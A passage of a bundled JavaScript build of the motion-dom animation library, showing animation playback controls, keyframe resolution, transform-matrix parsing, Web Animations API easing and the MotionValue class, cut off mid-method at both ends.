		this.state = "running";
		this.driver.start();
	}
	pause() {
		this.state = "paused";
		this.updateTime(time.now());
		this.holdTime = this.currentTime;
	}
	complete() {
		if (this.state !== "running") this.play();
		this.state = "finished";
		this.holdTime = null;
	}
	finish() {
		this.notifyFinished();
		this.teardown();
		this.state = "finished";
		this.options.onComplete?.();
	}
	cancel() {
		this.holdTime = null;
		this.startTime = 0;
		this.tick(0);
		this.teardown();
		this.options.onCancel?.();
	}
	teardown() {
		this.state = "idle";
		this.stopDriver();
		this.startTime = this.holdTime = null;
	}
	stopDriver() {
		if (!this.driver) return;
		this.driver.stop();
		this.driver = void 0;
	}
	sample(sampleTime) {
		this.startTime = 0;
		return this.tick(sampleTime, true);
	}
	attachTimeline(timeline) {
		if (this.options.allowFlatten) {
			this.options.type = "keyframes";
			this.options.ease = "linear";
			this.initAnimation();
		}
		this.driver?.stop();
		return timeline.observe(this);
	}
};
// node_modules/motion-dom/dist/es/animation/keyframes/utils/fill-wildcards.mjs
function fillWildcards(keyframes) {
	for (let i = 1; i < keyframes.length; i++) keyframes[i] ?? (keyframes[i] = keyframes[i - 1]);
}
// node_modules/motion-dom/dist/es/render/dom/parse-transform.mjs
var radToDeg = (rad) => rad * 180 / Math.PI;
var rotate = (v) => {
	return rebaseAngle(radToDeg(Math.atan2(v[1], v[0])));
};
var matrix2dParsers = {
	x: 4,
	y: 5,
	translateX: 4,
	translateY: 5,
	scaleX: 0,
	scaleY: 3,
	scale: (v) => (Math.abs(v[0]) + Math.abs(v[3])) / 2,
	rotate,
	rotateZ: rotate,
	skewX: (v) => radToDeg(Math.atan(v[1])),
	skewY: (v) => radToDeg(Math.atan(v[2])),
	skew: (v) => (Math.abs(v[1]) + Math.abs(v[2])) / 2
};
var rebaseAngle = (angle) => {
	angle = angle % 360;
	if (angle < 0) angle += 360;
	return angle;
};
var rotateZ = rotate;
var scaleX = (v) => Math.sqrt(v[0] * v[0] + v[1] * v[1]);
var scaleY = (v) => Math.sqrt(v[4] * v[4] + v[5] * v[5]);
var matrix3dParsers = {
	x: 12,
	y: 13,
	z: 14,
	translateX: 12,
	translateY: 13,
	translateZ: 14,
	scaleX,
	scaleY,
	scale: (v) => (scaleX(v) + scaleY(v)) / 2,
	rotateX: (v) => rebaseAngle(radToDeg(Math.atan2(v[6], v[5]))),
	rotateY: (v) => rebaseAngle(radToDeg(Math.atan2(-v[2], v[0]))),
	rotateZ,
	rotate: rotateZ,
	skewX: (v) => radToDeg(Math.atan(v[4])),
	skewY: (v) => radToDeg(Math.atan(v[1])),
	skew: (v) => (Math.abs(v[1]) + Math.abs(v[4])) / 2
};
function defaultTransformValue(name) {
	return name.includes("scale") ? 1 : 0;
}
function parseValueFromTransform(transform, name) {
	if (!transform || transform === "none") return defaultTransformValue(name);
	const matrix3dMatch = transform.match(/^matrix3d\(([-\d.e\s,]+)\)$/u);
	let parsers;
	let match;
	if (matrix3dMatch) {
		parsers = matrix3dParsers;
		match = matrix3dMatch;
	} else {
		const matrix2dMatch = transform.match(/^matrix\(([-\d.e\s,]+)\)$/u);
		parsers = matrix2dParsers;
		match = matrix2dMatch;
	}
	if (!match) return defaultTransformValue(name);
	const valueParser = parsers[name];
	const values = match[1].split(",").map(convertTransformToNumber);
	return typeof valueParser === "function" ? valueParser(values) : values[valueParser];
}
var readTransformValue = (instance, name) => {
	const { transform = "none" } = getComputedStyle(instance);
	return parseValueFromTransform(transform, name);
};
function convertTransformToNumber(value) {
	return parseFloat(value.trim());
}
// node_modules/motion-dom/dist/es/render/utils/keys-transform.mjs
/**
* Generate a list of every possible transform key.
*/
var transformPropOrder = [
	"transformPerspective",
	"x",
	"y",
	"z",
	"translateX",
	"translateY",
	"translateZ",
	"scale",
	"scaleX",
	"scaleY",
	"rotate",
	"rotateX",
	"rotateY",
	"rotateZ",
	"skew",
	"skewX",
	"skewY"
];
/**
* A quick lookup for transform props.
*
* `pathRotation` is a transform for routing purposes (skipped from raw
* style application, wired to the transform composite, flags transform
* dirty) but is intentionally NOT in `transformPropOrder` — it is
* composed onto `rotate` at the build sites, not serialized in its own
* slot, and must stay out of the order-array consumers (parse-transform,
* unit-conversion, keys-position).
*/
var transformProps = /*@__PURE__*/ (() => /* @__PURE__ */ new Set([...transformPropOrder, "pathRotation"]))();
// node_modules/motion-dom/dist/es/animation/keyframes/utils/unit-conversion.mjs
var isNumOrPxType = (v) => v === number || v === px;
var transformKeys = /* @__PURE__ */ new Set([
	"x",
	"y",
	"z"
]);
var nonTranslationalTransformKeys = transformPropOrder.filter((key) => !transformKeys.has(key));
function removeNonTranslationalTransform(visualElement) {
	const removedTransforms = [];
	nonTranslationalTransformKeys.forEach((key) => {
		const value = visualElement.getValue(key);
		if (value !== void 0) {
			removedTransforms.push([key, value.get()]);
			value.set(key.startsWith("scale") ? 1 : 0);
		}
	});
	return removedTransforms;
}
var positionalValues = {
	width: ({ x }, { paddingLeft = "0", paddingRight = "0", boxSizing }) => {
		const width = x.max - x.min;
		return boxSizing === "border-box" ? width : width - parseFloat(paddingLeft) - parseFloat(paddingRight);
	},
	height: ({ y }, { paddingTop = "0", paddingBottom = "0", boxSizing }) => {
		const height = y.max - y.min;
		return boxSizing === "border-box" ? height : height - parseFloat(paddingTop) - parseFloat(paddingBottom);
	},
	top: (_bbox, { top }) => parseFloat(top),
	left: (_bbox, { left }) => parseFloat(left),
	bottom: ({ y }, { top }) => parseFloat(top) + (y.max - y.min),
	right: ({ x }, { left }) => parseFloat(left) + (x.max - x.min),
	x: (_bbox, { transform }) => parseValueFromTransform(transform, "x"),
	y: (_bbox, { transform }) => parseValueFromTransform(transform, "y")
};
positionalValues.translateX = positionalValues.x;
positionalValues.translateY = positionalValues.y;
// node_modules/motion-dom/dist/es/animation/keyframes/KeyframesResolver.mjs
var toResolve = /* @__PURE__ */ new Set();
var isScheduled = false;
var anyNeedsMeasurement = false;
var isForced = false;
function measureAllKeyframes() {
	if (anyNeedsMeasurement) {
		const resolversToMeasure = Array.from(toResolve).filter((resolver) => resolver.needsMeasurement);
		const elementsToMeasure = new Set(resolversToMeasure.map((resolver) => resolver.element));
		const transformsToRestore = /* @__PURE__ */ new Map();
		/**
		* Write pass
		* If we're measuring elements we want to remove bounding box-changing transforms.
		*/
		elementsToMeasure.forEach((element) => {
			const removedTransforms = removeNonTranslationalTransform(element);
			if (!removedTransforms.length) return;
			transformsToRestore.set(element, removedTransforms);
			element.render();
		});
		resolversToMeasure.forEach((resolver) => resolver.measureInitialState());
		elementsToMeasure.forEach((element) => {
			element.render();
			const restore = transformsToRestore.get(element);
			if (restore) restore.forEach(([key, value]) => {
				element.getValue(key)?.set(value);
			});
		});
		resolversToMeasure.forEach((resolver) => resolver.measureEndState());
		resolversToMeasure.forEach((resolver) => {
			if (resolver.suspendedScrollY !== void 0) window.scrollTo(0, resolver.suspendedScrollY);
		});
	}
	anyNeedsMeasurement = false;
	isScheduled = false;
	toResolve.forEach((resolver) => resolver.complete(isForced));
	toResolve.clear();
}
function readAllKeyframes() {
	toResolve.forEach((resolver) => {
		resolver.readKeyframes();
		if (resolver.needsMeasurement) anyNeedsMeasurement = true;
	});
}
function flushKeyframeResolvers() {
	isForced = true;
	readAllKeyframes();
	measureAllKeyframes();
	isForced = false;
}
var KeyframeResolver = class {
	constructor(unresolvedKeyframes, onComplete, name, motionValue, element, isAsync = false) {
		this.state = "pending";
		/**
		* Track whether this resolver is async. If it is, it'll be added to the
		* resolver queue and flushed in the next frame. Resolvers that aren't going
		* to trigger read/write thrashing don't need to be async.
		*/
		this.isAsync = false;
		/**
		* Track whether this resolver needs to perform a measurement
		* to resolve its keyframes.
		*/
		this.needsMeasurement = false;
		this.unresolvedKeyframes = [...unresolvedKeyframes];
		this.onComplete = onComplete;
		this.name = name;
		this.motionValue = motionValue;
		this.element = element;
		this.isAsync = isAsync;
	}
	scheduleResolve() {
		this.state = "scheduled";
		if (this.isAsync) {
			toResolve.add(this);
			if (!isScheduled) {
				isScheduled = true;
				frame.read(readAllKeyframes);
				frame.resolveKeyframes(measureAllKeyframes);
			}
		} else {
			this.readKeyframes();
			this.complete();
		}
	}
	readKeyframes() {
		const { unresolvedKeyframes, name, element, motionValue } = this;
		if (unresolvedKeyframes[0] === null) {
			const currentValue = motionValue?.get();
			const finalKeyframe = unresolvedKeyframes[unresolvedKeyframes.length - 1];
			if (currentValue !== void 0) unresolvedKeyframes[0] = currentValue;
			else if (element && name) {
				const valueAsRead = element.readValue(name, finalKeyframe);
				if (valueAsRead !== void 0 && valueAsRead !== null) unresolvedKeyframes[0] = valueAsRead;
			}
			if (unresolvedKeyframes[0] === void 0) unresolvedKeyframes[0] = finalKeyframe;
			if (motionValue && currentValue === void 0) motionValue.set(unresolvedKeyframes[0]);
		}
		fillWildcards(unresolvedKeyframes);
	}
	setFinalKeyframe() {}
	measureInitialState() {}
	renderEndStyles() {}
	measureEndState() {}
	complete(isForcedComplete = false) {
		this.state = "complete";
		this.onComplete(this.unresolvedKeyframes, this.finalKeyframe, isForcedComplete);
		toResolve.delete(this);
	}
	cancel() {
		if (this.state === "scheduled") {
			toResolve.delete(this);
			this.state = "pending";
		}
	}
	resume() {
		if (this.state === "pending") this.scheduleResolve();
	}
};
// node_modules/motion-dom/dist/es/render/dom/is-css-var.mjs
var isCSSVar = (name) => name.startsWith("--");
// node_modules/motion-dom/dist/es/render/dom/style-set.mjs
function setStyle(element, name, value) {
	isCSSVar(name) ? element.style.setProperty(name, value) : element.style[name] = value;
}
// node_modules/motion-dom/dist/es/utils/supports/flags.mjs
/**
* Add the ability for test suites to manually set support flags
* to better test more environments.
*/
var supportsFlags = {};
// node_modules/motion-dom/dist/es/utils/supports/memo.mjs
function memoSupports(callback, supportsFlag) {
	const memoized = /* @__PURE__ */ memo(callback);
	return () => supportsFlags[supportsFlag] ?? memoized();
}
// node_modules/motion-dom/dist/es/utils/supports/scroll-timeline.mjs
var supportsScrollTimeline = /* @__PURE__ */ memoSupports(() => window.ScrollTimeline !== void 0, "scrollTimeline");
// node_modules/motion-dom/dist/es/utils/supports/linear-easing.mjs
var supportsLinearEasing = /*@__PURE__*/ memoSupports(() => {
	try {
		document.createElement("div").animate({ opacity: 0 }, { easing: "linear(0, 1)" });
	} catch (e) {
		return false;
	}
	return true;
}, "linearEasing");
// node_modules/motion-dom/dist/es/animation/waapi/easing/cubic-bezier.mjs
var cubicBezierAsString = ([a, b, c, d]) => `cubic-bezier(${a}, ${b}, ${c}, ${d})`;
// node_modules/motion-dom/dist/es/animation/waapi/easing/supported.mjs
var supportedWaapiEasing = {
	linear: "linear",
	ease: "ease",
	easeIn: "ease-in",
	easeOut: "ease-out",
	easeInOut: "ease-in-out",
	circIn: /*@__PURE__*/ cubicBezierAsString([
		0,
		.65,
		.55,
		1
	]),
	circOut: /*@__PURE__*/ cubicBezierAsString([
		.55,
		0,
		1,
		.45
	]),
	backIn: /*@__PURE__*/ cubicBezierAsString([
		.31,
		.01,
		.66,
		-.59
	]),
	backOut: /*@__PURE__*/ cubicBezierAsString([
		.33,
		1.53,
		.69,
		.99
	])
};
// node_modules/motion-dom/dist/es/animation/waapi/easing/map-easing.mjs
function mapEasingToNativeEasing(easing, duration) {
	if (!easing) return;
	else if (typeof easing === "function") return supportsLinearEasing() ? generateLinearEasing(easing, duration) : "ease-out";
	else if (/* @__PURE__ */ isBezierDefinition(easing)) return cubicBezierAsString(easing);
	else if (Array.isArray(easing)) return easing.map((segmentEasing) => mapEasingToNativeEasing(segmentEasing, duration) || supportedWaapiEasing.easeOut);
	else return supportedWaapiEasing[easing];
}
// node_modules/motion-dom/dist/es/animation/waapi/start-waapi-animation.mjs
function startWaapiAnimation(element, valueName, keyframes, { delay = 0, duration = 300, repeat = 0, repeatType = "loop", ease = "easeOut", times } = {}, pseudoElement = void 0) {
	const keyframeOptions = { [valueName]: keyframes };
	if (times) keyframeOptions.offset = times;
	const easing = mapEasingToNativeEasing(ease, duration);
	/**
	* If this is an easing array, apply to keyframes, not animation as a whole
	*/
	if (Array.isArray(easing)) keyframeOptions.easing = easing;
	const options = {
		delay,
		duration,
		easing: !Array.isArray(easing) ? easing : "linear",
		fill: "both",
		iterations: repeat + 1,
		direction: repeatType === "reverse" ? "alternate" : "normal"
	};
	if (pseudoElement) options.pseudoElement = pseudoElement;
	return element.animate(keyframeOptions, options);
}
// node_modules/motion-dom/dist/es/animation/generators/utils/is-generator.mjs
function isGenerator(type) {
	return typeof type === "function" && "applyToOptions" in type;
}
// node_modules/motion-dom/dist/es/animation/waapi/utils/apply-generator.mjs
function applyGeneratorOptions({ type, ...options }) {
	if (isGenerator(type) && supportsLinearEasing()) return type.applyToOptions(options);
	else {
		options.duration ?? (options.duration = 300);
		options.ease ?? (options.ease = "easeOut");
	}
	return options;
}
// node_modules/motion-dom/dist/es/animation/NativeAnimation.mjs
/**
* NativeAnimation implements AnimationPlaybackControls for the browser's Web Animations API.
*/
var NativeAnimation = class extends WithPromise {
	constructor(options) {
		super();
		this.finishedTime = null;
		this.isStopped = false;
		/**
		* Tracks a manually-set start time that takes precedence over WAAPI's
		* dynamic startTime. This is cleared when play() or time setter is called,
		* allowing WAAPI to take over timing.
		*/
		this.manualStartTime = null;
		if (!options) return;
		const { element, name, keyframes, pseudoElement, allowFlatten = false, finalKeyframe, onComplete } = options;
		this.isPseudoElement = Boolean(pseudoElement);
		this.allowFlatten = allowFlatten;
		this.options = options;
		options.type;
		const transition = applyGeneratorOptions(options);
		this.animation = startWaapiAnimation(element, name, keyframes, transition, pseudoElement);
		if (transition.autoplay === false) this.animation.pause();
		this.animation.onfinish = () => {
			this.finishedTime = this.time;
			if (!pseudoElement) {
				const keyframe = getFinalKeyframe(keyframes, this.options, finalKeyframe, this.speed);
				if (this.updateMotionValue) this.updateMotionValue(keyframe);
				/**
				* If we can, we want to commit the final style as set by the user,
				* rather than the computed keyframe value supplied by the animation.
				* We always do this, even when a motion value is present, to prevent
				* a visual flash in Firefox where the WAAPI animation's fill is removed
				* during cancel() before the scheduled render can apply the correct value.
				*/
				setStyle(element, name, keyframe);
				this.animation.cancel();
			}
			onComplete?.();
			this.notifyFinished();
		};
	}
	play() {
		if (this.isStopped) return;
		this.manualStartTime = null;
		this.animation.play();
		if (this.state === "finished") this.updateFinished();
	}
	pause() {
		this.animation.pause();
	}
	complete() {
		this.animation.finish?.();
	}
	cancel() {
		try {
			this.animation.cancel();
		} catch (e) {}
	}
	stop() {
		if (this.isStopped) return;
		this.isStopped = true;
		const { state } = this;
		if (state === "idle" || state === "finished") return;
		if (this.updateMotionValue) this.updateMotionValue();
		else this.commitStyles();
		if (!this.isPseudoElement) this.cancel();
	}
	/**
	* WAAPI doesn't natively have any interruption capabilities.
	*
	* In this method, we commit styles back to the DOM before cancelling
	* the animation.
	*
	* This is designed to be overridden by NativeAnimationExtended, which
	* will create a renderless JS animation and sample it twice to calculate
	* its current value, "previous" value, and therefore allow
	* Motion to also correctly calculate velocity for any subsequent animation
	* while deferring the commit until the next animation frame.
	*/
	commitStyles() {
		const element = this.options?.element;
		if (!this.isPseudoElement && element?.isConnected) this.animation.commitStyles?.();
	}
	get duration() {
		const duration = this.animation.effect?.getComputedTiming?.().duration || 0;
		return /* @__PURE__ */ millisecondsToSeconds(Number(duration));
	}
	get iterationDuration() {
		const { delay = 0 } = this.options || {};
		return this.duration + /* @__PURE__ */ millisecondsToSeconds(delay);
	}
	get time() {
		return /* @__PURE__ */ millisecondsToSeconds(Number(this.animation.currentTime) || 0);
	}
	set time(newTime) {
		const wasFinished = this.finishedTime !== null;
		this.manualStartTime = null;
		this.finishedTime = null;
		this.animation.currentTime = /* @__PURE__ */ secondsToMilliseconds(newTime);
		if (wasFinished) this.animation.pause();
	}
	/**
	* The playback speed of the animation.
	* 1 = normal speed, 2 = double speed, 0.5 = half speed.
	*/
	get speed() {
		return this.animation.playbackRate;
	}
	set speed(newSpeed) {
		if (newSpeed < 0) this.finishedTime = null;
		this.animation.playbackRate = newSpeed;
	}
	get state() {
		return this.finishedTime !== null ? "finished" : this.animation.playState;
	}
	get startTime() {
		return this.manualStartTime ?? Number(this.animation.startTime);
	}
	set startTime(newStartTime) {
		this.manualStartTime = this.animation.startTime = newStartTime;
	}
	/**
	* Attaches a timeline to the animation, for instance the `ScrollTimeline`.
	*/
	attachTimeline({ timeline, rangeStart, rangeEnd, observe }) {
		if (this.allowFlatten) this.animation.effect?.updateTiming({ easing: "linear" });
		this.animation.onfinish = null;
		if (timeline && supportsScrollTimeline()) {
			this.animation.timeline = timeline;
			if (rangeStart) this.animation.rangeStart = rangeStart;
			if (rangeEnd) this.animation.rangeEnd = rangeEnd;
			return noop;
		} else return observe(this);
	}
};
// node_modules/motion-dom/dist/es/animation/waapi/utils/unsupported-easing.mjs
var unsupportedEasingFunctions = {
	anticipate,
	backInOut,
	circInOut
};
function isUnsupportedEase(key) {
	return key in unsupportedEasingFunctions;
}
function replaceStringEasing(transition) {
	if (typeof transition.ease === "string" && isUnsupportedEase(transition.ease)) transition.ease = unsupportedEasingFunctions[transition.ease];
}
// node_modules/motion-dom/dist/es/animation/NativeAnimationExtended.mjs
/**
* 10ms is chosen here as it strikes a balance between smooth
* results (more than one keyframe per frame at 60fps) and
* keyframe quantity.
*/
var sampleDelta = 10;
var NativeAnimationExtended = class extends NativeAnimation {
	constructor(options) {
		/**
		* The base NativeAnimation function only supports a subset
		* of Motion easings, and WAAPI also only supports some
		* easing functions via string/cubic-bezier definitions.
		*
		* This function replaces those unsupported easing functions
		* with a JS easing function. This will later get compiled
		* to a linear() easing function.
		*/
		replaceStringEasing(options);
		/**
		* Ensure we replace the transition type with a generator function
		* before passing to WAAPI.
		*
		* TODO: Does this have a better home? It could be shared with
		* JSAnimation.
		*/
		replaceTransitionType(options);
		super(options);
		/**
		* Only set startTime when the animation should autoplay.
		* Setting startTime on a paused WAAPI animation unpauses it
		* (per the WAAPI spec), which breaks autoplay: false.
		*/
		if (options.startTime !== void 0 && options.autoplay !== false) this.startTime = options.startTime;
		this.options = options;
	}
	/**
	* WAAPI doesn't natively have any interruption capabilities.
	*
	* Rather than read committed styles back out of the DOM, we can
	* create a renderless JS animation and sample it twice to calculate
	* its current value, "previous" value, and therefore allow
	* Motion to calculate velocity for any subsequent animation.
	*/
	updateMotionValue(value) {
		const { motionValue, onUpdate, onComplete, element, ...options } = this.options;
		if (!motionValue) return;
		if (value !== void 0) {
			motionValue.set(value);
			return;
		}
		const sampleAnimation = new JSAnimation({
			...options,
			autoplay: false
		});
		/**
		* Use wall-clock elapsed time for sampling.
		* Under CPU load, WAAPI's currentTime may not reflect actual
		* elapsed time, causing incorrect sampling and visual jumps.
		*/
		const sampleTime = Math.max(sampleDelta, time.now() - this.startTime);
		const delta = clamp(0, sampleDelta, sampleTime - sampleDelta);
		const current = sampleAnimation.sample(sampleTime).value;
		/**
		* Write the estimated value to inline style so it persists
		* after cancel(), covering the async gap before the next
		* animation starts.
		*/
		const { name } = this.options;
		if (element && name) setStyle(element, name, current);
		motionValue.setWithVelocity(sampleAnimation.sample(Math.max(0, sampleTime - delta)).value, current, delta);
		sampleAnimation.stop();
	}
};
// node_modules/motion-dom/dist/es/animation/utils/is-animatable.mjs
/**
* Check if a value is animatable. Examples:
*
* ✅: 100, "100px", "#fff"
* ❌: "block", "url(2.jpg)"
* @param value
*
* @internal
*/
var isAnimatable = (value, name) => {
	if (name === "zIndex") return false;
	if (typeof value === "number" || Array.isArray(value)) return true;
	if (typeof value === "string" && (complex.test(value) || value === "0") && !value.startsWith("url(")) return true;
	return false;
};
// node_modules/motion-dom/dist/es/animation/utils/can-animate.mjs
function hasKeyframesChanged(keyframes) {
	const current = keyframes[0];
	if (keyframes.length === 1) return true;
	for (let i = 0; i < keyframes.length; i++) if (keyframes[i] !== current) return true;
}
function canAnimate(keyframes, name, type, velocity) {
	/**
	* Check if we're able to animate between the start and end keyframes,
	* and throw a warning if we're attempting to animate between one that's
	* animatable and another that isn't.
	*/
	const originKeyframe = keyframes[0];
	if (originKeyframe === null) return false;
	/**
	* These aren't traditionally animatable but we do support them.
	* In future we could look into making this more generic or replacing
	* this function with mix() === mixImmediate
	*/
	if (name === "display" || name === "visibility") return true;
	const targetKeyframe = keyframes[keyframes.length - 1];
	const isOriginAnimatable = isAnimatable(originKeyframe, name);
	const isTargetAnimatable = isAnimatable(targetKeyframe, name);
	`${name}${originKeyframe}${targetKeyframe}${isOriginAnimatable ? targetKeyframe : originKeyframe}`;
	if (!isOriginAnimatable || !isTargetAnimatable) return false;
	return hasKeyframesChanged(keyframes) || (type === "spring" || isGenerator(type)) && velocity;
}
// node_modules/motion-dom/dist/es/animation/utils/make-animation-instant.mjs
function makeAnimationInstant(options) {
	options.duration = 0;
	options.type = "keyframes";
}
// node_modules/motion-dom/dist/es/animation/waapi/utils/accelerated-values.mjs
/**
* A list of values that can be hardware-accelerated.
*/
var acceleratedValues = /* @__PURE__ */ new Set([
	"opacity",
	"clipPath",
	"filter",
	"transform",
	"backgroundColor"
]);
// node_modules/motion-dom/dist/es/animation/waapi/utils/is-browser-color.mjs
var browserColorFunctions = /^(?:oklch|oklab|lab|lch|color|color-mix|light-dark)\(/;
function hasBrowserOnlyColors(keyframes) {
	for (let i = 0; i < keyframes.length; i++) if (typeof keyframes[i] === "string" && browserColorFunctions.test(keyframes[i])) return true;
	return false;
}
// node_modules/motion-dom/dist/es/animation/waapi/supports/waapi.mjs
var colorProperties = /* @__PURE__ */ new Set([
	"color",
	"backgroundColor",
	"outlineColor",
	"fill",
	"stroke",
	"borderColor",
	"borderTopColor",
	"borderRightColor",
	"borderBottomColor",
	"borderLeftColor"
]);
var supportsWaapi = /*@__PURE__*/ memo(() => Object.hasOwnProperty.call(Element.prototype, "animate"));
function supportsBrowserAnimation(options) {
	const { motionValue, name, repeatDelay, repeatType, damping, type, keyframes } = options;
	const subject = motionValue?.owner?.current;
	/**
	* We use instanceof checks instead of isHTMLElement()/isSVGElement()
	* because we explicitly **don't** want elements in different timing
	* contexts (i.e. popups) to be accelerated, as it's not possible to sync
	* these animations properly with those driven from the main window
	* frameloop.
	*/
	if (!(subject instanceof HTMLElement) && !(subject instanceof SVGElement)) return false;
	const { onUpdate, transformTemplate } = motionValue.owner.getProps();
	return supportsWaapi() && name && (acceleratedValues.has(name) || colorProperties.has(name) && hasBrowserOnlyColors(keyframes)) && (name !== "transform" || !transformTemplate) && !onUpdate && !repeatDelay && repeatType !== "mirror" && damping !== 0 && type !== "inertia";
}
// node_modules/motion-dom/dist/es/animation/AsyncMotionValueAnimation.mjs
/**
* Maximum time allowed between an animation being created and it being
* resolved for us to use the latter as the start time.
*
* This is to ensure that while we prefer to "start" an animation as soon
* as it's triggered, we also want to avoid a visual jump if there's a big delay
* between these two moments.
*/
var MAX_RESOLVE_DELAY = 40;
var AsyncMotionValueAnimation = class extends WithPromise {
	constructor({ autoplay = true, delay = 0, type = "keyframes", repeat = 0, repeatDelay = 0, repeatType = "loop", keyframes, name, motionValue, element, ...options }) {
		super();
		/**
		* Bound to support return animation.stop pattern
		*/
		this.stop = () => {
			if (this._animation) {
				this._animation.stop();
				this.stopTimeline?.();
			}
			this.keyframeResolver?.cancel();
		};
		this.createdAt = time.now();
		const optionsWithDefaults = {
			autoplay,
			delay,
			type,
			repeat,
			repeatDelay,
			repeatType,
			name,
			motionValue,
			element,
			...options
		};
		const KeyframeResolver$1 = element?.KeyframeResolver || KeyframeResolver;
		this.keyframeResolver = new KeyframeResolver$1(keyframes, (resolvedKeyframes, finalKeyframe, forced) => this.onKeyframesResolved(resolvedKeyframes, finalKeyframe, optionsWithDefaults, !forced), name, motionValue, element);
		this.keyframeResolver?.scheduleResolve();
	}
	onKeyframesResolved(keyframes, finalKeyframe, options, sync) {
		this.keyframeResolver = void 0;
		const { name, type, velocity, delay, isHandoff, onUpdate } = options;
		this.resolvedAt = time.now();
		/**
		* If we can't animate this value with the resolved keyframes
		* then we should complete it immediately.
		*/
		let canAnimateValue = true;
		if (!canAnimate(keyframes, name, type, velocity)) {
			canAnimateValue = false;
			if (MotionGlobalConfig.instantAnimations || !delay) onUpdate?.(getFinalKeyframe(keyframes, options, finalKeyframe));
			keyframes[0] = keyframes[keyframes.length - 1];
			makeAnimationInstant(options);
			options.repeat = 0;
		}
		const resolvedOptions = {
			startTime: sync ? !this.resolvedAt ? this.createdAt : this.resolvedAt - this.createdAt > MAX_RESOLVE_DELAY ? this.resolvedAt : this.createdAt : void 0,
			finalKeyframe,
			...options,
			keyframes
		};
		/**
		* Animate via WAAPI if possible. If this is a handoff animation, the optimised animation will be running via
		* WAAPI. Therefore, this animation must be JS to ensure it runs "under" the
		* optimised animation.
		*
		* Also skip WAAPI when keyframes aren't animatable, as the resolved
		* values may not be valid CSS and would trigger browser warnings.
		*/
		const useWaapi = canAnimateValue && !isHandoff && supportsBrowserAnimation(resolvedOptions);
		const element = resolvedOptions.motionValue?.owner?.current;
		let animation;
		if (useWaapi) try {
			animation = new NativeAnimationExtended({
				...resolvedOptions,
				element
			});
		} catch {
			animation = new JSAnimation(resolvedOptions);
		}
		else animation = new JSAnimation(resolvedOptions);
		animation.finished.then(() => {
			this.notifyFinished();
		}).catch(noop);
		if (this.pendingTimeline) {
			this.stopTimeline = animation.attachTimeline(this.pendingTimeline);
			this.pendingTimeline = void 0;
		}
		this._animation = animation;
	}
	get finished() {
		if (!this._animation) return this._finished;
		else return this.animation.finished;
	}
	then(onResolve, _onReject) {
		return this.finished.finally(onResolve).then(() => {});
	}
	get animation() {
		if (!this._animation) {
			this.keyframeResolver?.resume();
			flushKeyframeResolvers();
		}
		return this._animation;
	}
	get duration() {
		return this.animation.duration;
	}
	get iterationDuration() {
		return this.animation.iterationDuration;
	}
	get time() {
		return this.animation.time;
	}
	set time(newTime) {
		this.animation.time = newTime;
	}
	get speed() {
		return this.animation.speed;
	}
	get state() {
		return this.animation.state;
	}
	set speed(newSpeed) {
		this.animation.speed = newSpeed;
	}
	get startTime() {
		return this.animation.startTime;
	}
	attachTimeline(timeline) {
		if (this._animation) this.stopTimeline = this.animation.attachTimeline(timeline);
		else this.pendingTimeline = timeline;
		return () => this.stop();
	}
	play() {
		this.animation.play();
	}
	pause() {
		this.animation.pause();
	}
	complete() {
		this.animation.complete();
	}
	cancel() {
		if (this._animation) this.animation.cancel();
		this.keyframeResolver?.cancel();
	}
};
// node_modules/motion-dom/dist/es/animation/utils/calc-child-stagger.mjs
function calcChildStagger(children, child, delayChildren, staggerChildren = 0, staggerDirection = 1) {
	const index = Array.from(children).sort((a, b) => a.sortNodePosition(b)).indexOf(child);
	const numChildren = children.size;
	const maxStaggerDuration = (numChildren - 1) * staggerChildren;
	return typeof delayChildren === "function" ? delayChildren(index, numChildren) : staggerDirection === 1 ? index * staggerChildren : maxStaggerDuration - index * staggerChildren;
}
// node_modules/motion-dom/dist/es/value/index.mjs
/**
* Maximum time between the value of two frames, beyond which we
* assume the velocity has since been 0.
*/
var MAX_VELOCITY_DELTA = 30;
var isFloat = (value) => {
	return !isNaN(parseFloat(value));
};
var collectMotionValues = { current: void 0 };
/**
* `MotionValue` is used to track the state and velocity of motion values.
*
* @public
*/
var MotionValue = class {
	/**
	* @param init - The initiating value
	* @param config - Optional configuration options
	*
	* -  `transformer`: A function to transform incoming values with.
	*/
	constructor(init, options = {}) {
		/**
		* Tracks whether this value can output a velocity. Currently this is only true
		* if the value is numerical, but we might be able to widen the scope here and support
		* other value types.
		*
		* @internal
		*/
		this.canTrackVelocity = null;
		/**
		* An object containing a SubscriptionManager for each active event.
		*/
		this.events = {};
		this.updateAndNotify = (v) => {
			const currentTime = time.now();
			/**
			* If we're updating the value during another frame or eventloop
			* than the previous frame, then the we set the previous frame value
			* to current.
			*/
			if (this.updatedAt !== currentTime) this.setPrevFrameValue();
			this.prev = this.current;
			this.setCurrent(v);
			if (this.current !== this.prev) {
				this.events.change?.notify(this.current);
				if (this.dependents) for (const dependent of this.dependents) dependent.dirty();
			}
		};
		this.hasAnimated = false;
		this.setCurrent(init);
		this.owner = options.owner;
	}
	setCurrent(current) {
		this.current = current;
		this.updatedAt = time.now();
		if (this.canTrackVelocity === null && current !== void 0) this.canTrackVelocity = isFloat(this.current);
	}
	setPrevFrameValue(prevFrameValue = this.current) {
		this.prevFrameValue = prevFrameValue;
		this.prevUpdatedAt = this.updatedAt;
	}
	/**
	* Adds a function that will be notified when the `MotionValue` is updated.
	*
	* It returns a function that, when called, will cancel the subscription.
	*
	* When calling `onChange` inside a React component, it should be wrapped with the
	* `useEffect` hook. As it returns an unsubscribe function, this should be returned
	* from the `useEffect` function to ensure you don't add duplicate subscribers..
	*
	* ```jsx
	* export const MyComponent = () => {
	*   const x = useMotionValue(0)
	*   const y = useMotionValue(0)
	*   const opacity = useMotionValue(1)
	*
	*   useEffect(() => {
	*     function updateOpacity() {
	*       const maxXY = Math.max(x.get(), y.get())
	*       const newOpacity = transform(maxXY, [0, 100], [1, 0])
	*       opacity.set(newOpacity)
	*     }
	*
	*     const unsubscribeX = x.on("change", updateOpacity)
	*     const unsubscribeY = y.on("change", updateOpacity)
	*
	*     return () => {
	*       unsubscribeX()
	*       unsubscribeY()
	*     }
	*   }, [])
	*
	*   return <motion.div style={{ x }} />
	* }
	* ```
	*
	* @param subscriber - A function that receives the latest value.
	* @returns A function that, when called, will cancel this subscription.
	*
	* @deprecated
	*/
	onChange(subscription) {
		return this.on("change", subscription);
	}
	on(eventName, callback) {
		if (!this.events[eventName]) this.events[eventName] = new SubscriptionManager();
		const unsubscribe = this.events[eventName].add(callback);
		if (eventName === "change") return () => {
			unsubscribe();
			/**
			* If we have no more change listeners by the start
			* of the next frame, stop active animations.
			*/
			frame.read(() => {
